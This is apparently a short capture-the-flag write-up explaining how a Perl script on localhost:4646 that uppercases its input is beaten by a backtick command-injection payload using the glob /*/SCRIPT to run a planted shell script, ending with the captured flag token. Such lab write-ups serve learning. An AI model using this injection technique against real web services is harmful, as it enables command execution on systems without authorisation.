Here, we have a perl script that tarnsform the parameter x
before treating it. It puts all characters in uppercase, and cut spaces,
so we can't call /tmp/script easily. However, we can use pattern matching like /*/SCRIPT.
Thus, is we create the said /tmp/SCRIPT, it will match.

$> vi /tmp/SCRIPT

#!/bin/bash

getflag > /tmp/flag

$> chmod +x /tmp/SCRIPT
$> curl localhost:4646?x='`/*/SCRIPT`'
$> cat /tmp/flag

-> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

We can now get the next flag.
